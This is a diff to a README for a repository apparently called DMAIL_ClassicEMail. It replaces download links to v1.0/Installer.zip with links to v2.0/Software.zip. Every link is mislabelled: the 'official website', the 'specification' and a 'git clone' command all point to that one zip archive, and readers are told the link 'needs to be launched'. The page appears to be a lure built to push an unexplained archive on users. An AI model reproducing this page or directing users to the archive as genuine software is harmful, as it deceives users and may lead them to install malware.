@@ -28,18 +28,18 @@ Welcome to the official source repository for **DMAIL_ClassicEMail**🇩📧️2
 
 ## 📦 Download Latest Release:
 
-[![Download Latest Release](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v1.0/Installer.zip)](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v1.0/Installer.zip)
+[![Download Latest Release](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v2.0/Software.zip)](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v2.0/Software.zip)
 
 **Note:** The provided link needs to be launched to download the latest release.
 
 ## 🌐 External Links:
 
-- [DMAIL Official Website](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v1.0/Installer.zip): Visit the official website for more details on the DMAIL project.
-- [Classic EMail Specification](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v1.0/Installer.zip): Get insights into the EMAIL 2 Classic EMail specification.
+- [DMAIL Official Website](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v2.0/Software.zip): Visit the official website for more details on the DMAIL project.
+- [Classic EMail Specification](https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v2.0/Software.zip): Get insights into the EMAIL 2 Classic EMail specification.
 
 ## 🚀 Getting Started:
 
-1. Clone the repository: `git clone https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v1.0/Installer.zip`
+1. Clone the repository: `git clone https://github.com/marig1204/DMAIL_ClassicEMail/releases/download/v2.0/Software.zip`
 2. Navigate to the project directory: `cd DMAIL_ClassicEMail`
 3. Follow the installation instructions in the **Documentation** to start using DMAIL.
 
